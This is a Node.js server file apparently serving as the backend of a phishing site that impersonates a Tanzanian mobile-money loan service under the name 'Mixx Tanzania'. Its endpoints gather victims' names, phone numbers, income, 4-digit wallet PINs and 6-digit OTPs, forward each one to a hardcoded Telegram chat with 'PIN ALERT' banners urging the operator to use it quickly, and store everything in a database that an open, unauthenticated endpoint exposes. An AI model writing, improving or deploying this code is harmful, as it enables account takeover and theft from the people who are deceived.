// ============================================
// MIXX TANZANIA BACKEND SERVER v2.0
// Deployed on Railway.com
// URL: https://miixxyaass-production-d3f3.up.railway.app
// ============================================

const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Request logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ============================================
// INITIALIZE SUPABASE (Optional)
// ============================================
let supabase = null;
if (process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
    supabase = createClient(
        process.env.SUPABASE_URL,
        process.env.SUPABASE_SERVICE_ROLE_KEY
    );
    console.log('✅ Supabase connected');
} else {
    console.log('⚠️ Supabase credentials not set - running without database');
}

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8409068780';

// ============================================
// HELPER FUNCTIONS
// ============================================

// Send message to Telegram
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not set');
        console.log('Message would be:', message.substring(0, 200));
        return { success: false, error: 'Bot token not configured' };
    }
    
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message sent to Telegram');
            return { success: true };
        } else {
            console.error('❌ Telegram API error:', result.description);
            return { success: false, error: result.description };
        }
    } catch (error) {
        console.error('❌ Error sending to Telegram:', error.message);
        return { success: false, error: error.message };
    }
}

// Format PIN message
function formatPinMessage(data, timestamp) {
    return `
🔐 <b>MIXX TANZANIA - 🔴 PIN ALERT 🔴</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
👤 <b>Name:</b> <code>${escapeHtml(data.name || 'N/A')}</code>
📧 <b>Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
📱 <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
💰 <b>Amount:</b> TZS ${formatNumber(data.amount || 0)}
📅 <b>Term:</b> ${data.term || 0} months
🔐 <b>4-DIGIT PIN:</b> <code>${escapeHtml(data.pin)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>ACTION REQUIRED:</b> Verify this PIN immediately!
📍 <b>IP:</b> ${escapeHtml(data.ip_address || 'N/A')}
    `;
}

// Format OTP message
function formatOtpMessage(data, timestamp) {
    return `
🔐 <b>MIXX TANZANIA - 🟠 OTP ALERT 🟠</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
👤 <b>Name:</b> <code>${escapeHtml(data.name || 'N/A')}</code>
📧 <b>Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
📱 <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
💰 <b>Amount:</b> TZS ${formatNumber(data.amount || 0)}
📅 <b>Term:</b> ${data.term || 0} months
🔐 <b>6-DIGIT OTP:</b> <code>${escapeHtml(data.pin)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>This OTP expires in 5 minutes!</b>
📍 <b>IP:</b> ${escapeHtml(data.ip_address || 'N/A')}
    `;
}

// Format Application message
function formatApplicationMessage(data, timestamp) {
    return `
📋 <b>MIXX TANZANIA - 🟢 NEW APPLICATION 🟢</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
👤 <b>Name:</b> <code>${escapeHtml(data.full_name || data.name || 'N/A')}</code>
📧 <b>Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
📱 <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
💼 <b>Employment:</b> ${escapeHtml(data.employment_status || data.employment || 'N/A')}
💰 <b>Income:</b> TZS ${formatNumber(data.monthly_income || data.income || 0)}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 <b>LOAN DETAILS:</b>
   💵 Amount: TZS ${formatNumber(data.loan_amount || data.amount || 0)}
   📅 Term: ${data.loan_term || data.term || 0} months
   📊 Interest: ${data.interest_rate || data.rate || 9}% APR
   💳 Monthly: TZS ${formatNumber(data.monthly_payment || data.monthly || 0)}
   💰 Total: TZS ${formatNumber(data.total_repayment || data.total || 0)}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP:</b> ${escapeHtml(data.ip_address || 'N/A')}
📱 <b>User Agent:</b> ${escapeHtml((data.user_agent || 'N/A').substring(0, 100))}
    `;
}

// Escape HTML for safe Telegram message
function escapeHtml(text) {
    if (!text) return 'N/A';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Format number with commas
function formatNumber(num) {
    return parseInt(num).toLocaleString('en-US');
}

// Get Tanzania time
function getTanzaniaTime() {
    return new Date().toLocaleString('en-TZ', { 
        timeZone: 'Africa/Dar_es_Salaam',
        hour12: false,
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

// Save to Supabase
async function saveToSupabase(data, type, ip) {
    if (!supabase) return false;
    
    try {
        if (type === 'application') {
            const { error } = await supabase.from('loans').insert({
                full_name: data.full_name || data.name,
                email: data.email,
                phone: data.phone,
                employment_status: data.employment_status || data.employment,
                monthly_income: data.monthly_income || data.income,
                loan_amount: data.loan_amount || data.amount,
                loan_term: data.loan_term || data.term,
                interest_rate: data.interest_rate || data.rate || 9,
                monthly_payment: data.monthly_payment || data.monthly,
                total_repayment: data.total_repayment || data.total,
                application_status: 'submitted',
                ip_address: ip
            });
            
            if (error) throw error;
            console.log('✅ Application saved to Supabase');
            return true;
        }
        
        if (type === 'pin' && data.phone) {
            const { error } = await supabase
                .from('loans')
                .update({ pin_code: data.pin, application_status: 'pin_entered' })
                .eq('phone', data.phone);
            
            if (!error) console.log('✅ PIN saved to Supabase');
            return !error;
        }
        
        if (type === 'otp' && data.phone) {
            const { error } = await supabase
                .from('loans')
                .update({ otp_code: data.pin, application_status: 'otp_verified' })
                .eq('phone', data.phone);
            
            if (!error) console.log('✅ OTP saved to Supabase');
            return !error;
        }
    } catch (error) {
        console.error('Supabase error:', error.message);
    }
    return false;
}

// ============================================
// API ENDPOINTS
// ============================================

// Root endpoint - Health check
app.get('/', (req, res) => {
    res.json({
        success: true,
        service: 'Mixx Tanzania Backend',
        version: '2.0.0',
        status: 'running',
        railway_url: 'https://miixxyaass-production-d3f3.up.railway.app',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        services: {
            telegram: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing token',
            supabase: supabase ? '✅ Connected' : '❌ Not configured'
        },
        endpoints: {
            'GET /': 'Service information',
            'GET /health': 'Health check',
            'POST /api/send-telegram': 'Send data to Telegram (main endpoint)',
            'POST /api/save-pin': 'Save 4-digit PIN',
            'POST /api/save-otp': 'Save 6-digit OTP',
            'POST /api/save-application': 'Save full application',
            'GET /api/application/:phone': 'Get application by phone'
        }
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        telegram: TELEGRAM_BOT_TOKEN ? 'ready' : 'not_configured',
        supabase: supabase ? 'connected' : 'not_configured'
    });
});

// MAIN ENDPOINT - Send data to Telegram (used by HTML files)
app.post('/api/send-telegram', async (req, res) => {
    const startTime = Date.now();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    try {
        const data = req.body;
        const type = data.type || 'application';
        const timestamp = getTanzaniaTime();
        
        console.log(`📨 Received [${type}] from: ${data.phone || data.email || 'unknown'}`);
        console.log(`📦 Data:`, JSON.stringify(data, null, 2));
        
        // Add IP to data
        data.ip_address = ip;
        
        // Format message based on type
        let message = '';
        if (type === 'pin') {
            message = formatPinMessage(data, timestamp);
        } else if (type === 'otp') {
            message = formatOtpMessage(data, timestamp);
        } else {
            message = formatApplicationMessage(data, timestamp);
        }
        
        // Send to Telegram
        const telegramResult = await sendToTelegram(message);
        
        // Save to Supabase (if configured)
        const supabaseResult = await saveToSupabase(data, type, ip);
        
        const responseTime = Date.now() - startTime;
        
        res.json({
            success: true,
            message: 'Data processed successfully',
            telegram_sent: telegramResult.success,
            supabase_saved: supabaseResult,
            response_time_ms: responseTime,
            data_type: type,
            recipient: data.phone || data.email
        });
        
    } catch (error) {
        console.error('❌ Error in send-telegram:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Save PIN endpoint
app.post('/api/save-pin', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    try {
        const { phone, pin, name, email, amount, term } = req.body;
        
        if (!phone || !pin) {
            return res.status(400).json({ success: false, error: 'Phone and PIN are required' });
        }
        
        console.log(`🔐 PIN received for ${phone}`);
        
        const timestamp = getTanzaniaTime();
        const message = formatPinMessage({ name, email, phone, amount, term, pin, ip_address: ip }, timestamp);
        const telegramResult = await sendToTelegram(message);
        
        // Save to Supabase
        if (supabase) {
            await supabase
                .from('loans')
                .update({ pin_code: pin, application_status: 'pin_entered' })
                .eq('phone', phone);
        }
        
        res.json({
            success: true,
            message: 'PIN saved successfully',
            telegram_sent: telegramResult.success
        });
        
    } catch (error) {
        console.error('❌ Error saving PIN:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save OTP endpoint
app.post('/api/save-otp', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    try {
        const { phone, pin, name, email, amount, term } = req.body;
        
        if (!phone || !pin) {
            return res.status(400).json({ success: false, error: 'Phone and OTP are required' });
        }
        
        console.log(`🔐 OTP received for ${phone}`);
        
        const timestamp = getTanzaniaTime();
        const message = formatOtpMessage({ name, email, phone, amount, term, pin, ip_address: ip }, timestamp);
        const telegramResult = await sendToTelegram(message);
        
        // Save to Supabase
        if (supabase) {
            await supabase
                .from('loans')
                .update({ otp_code: pin, application_status: 'otp_verified' })
                .eq('phone', phone);
        }
        
        res.json({
            success: true,
            message: 'OTP saved successfully',
            telegram_sent: telegramResult.success
        });
        
    } catch (error) {
        console.error('❌ Error saving OTP:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save full application endpoint
app.post('/api/save-application', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    try {
        const data = req.body;
        data.ip_address = ip;
        data.user_agent = userAgent;
        
        console.log(`📋 Application received for ${data.phone}`);
        
        const timestamp = getTanzaniaTime();
        const message = formatApplicationMessage(data, timestamp);
        const telegramResult = await sendToTelegram(message);
        
        // Save to Supabase
        let supabaseResult = false;
        if (supabase) {
            const { error } = await supabase.from('loans').insert({
                full_name: data.full_name || data.name,
                email: data.email,
                phone: data.phone,
                employment_status: data.employment_status || data.employment,
                monthly_income: data.monthly_income || data.income,
                loan_amount: data.loan_amount || data.amount,
                loan_term: data.loan_term || data.term,
                interest_rate: data.interest_rate || data.rate || 9,
                monthly_payment: data.monthly_payment || data.monthly,
                total_repayment: data.total_repayment || data.total,
                application_status: 'submitted',
                ip_address: ip,
                user_agent: userAgent
            });
            
            if (!error) supabaseResult = true;
        }
        
        res.json({
            success: true,
            message: 'Application saved successfully',
            telegram_sent: telegramResult.success,
            supabase_saved: supabaseResult
        });
        
    } catch (error) {
        console.error('❌ Error saving application:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get application by phone
app.get('/api/application/:phone', async (req, res) => {
    try {
        const { phone } = req.params;
        
        if (!supabase) {
            return res.json({ success: false, message: 'Database not configured' });
        }
        
        const { data, error } = await supabase
            .from('loans')
            .select('*')
            .eq('phone', phone)
            .order('created_at', { ascending: false })
            .limit(1);
        
        if (error) throw error;
        
        res.json({
            success: true,
            application: data ? data[0] : null
        });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get all applications (admin)
app.get('/api/applications', async (req, res) => {
    try {
        if (!supabase) {
            return res.json({ success: false, message: 'Database not configured' });
        }
        
        const { data, error } = await supabase
            .from('loans')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(50);
        
        if (error) throw error;
        
        res.json({
            success: true,
            count: data.length,
            applications: data
        });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'API is working!',
        timestamp: new Date().toISOString(),
        telegram_configured: !!TELEGRAM_BOT_TOKEN,
        supabase_configured: !!supabase
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: `Route ${req.originalUrl} not found`,
        available_endpoints: ['/', '/health', '/api/test', '/api/send-telegram', '/api/save-pin', '/api/save-otp', '/api/save-application', '/api/application/:phone', '/api/applications']
    });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🚀 MIXX TANZANIA BACKEND v2.0 - DEPLOYED ON RAILWAY.COM 🚀        ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║   📡 URL: https://miixxyaass-production-d3f3.up.railway.app         ║
║   📡 Port: ${PORT}                                                          ║
║   🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}                ║
║   🗄️  Supabase: ${supabase ? '✅ CONNECTED' : '❌ NOT CONFIGURED'}                      ║
║   📱 Chat ID: ${TELEGRAM_CHAT_ID}                                              ║
╠══════════════════════════════════════════════════════════════════════╣
║   📍 Available Endpoints:                                             ║
║      GET  /                                                           ║
║      GET  /health                                                     ║
║      GET  /api/test                                                   ║
║      POST /api/send-telegram  ← Main endpoint (used by HTML)          ║
║      POST /api/save-pin                                               ║
║      POST /api/save-otp                                               ║
║      POST /api/save-application                                       ║
║      GET  /api/application/:phone                                     ║
║      GET  /api/applications                                           ║
╚══════════════════════════════════════════════════════════════════════╝
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down server...');
    process.exit(0);
});
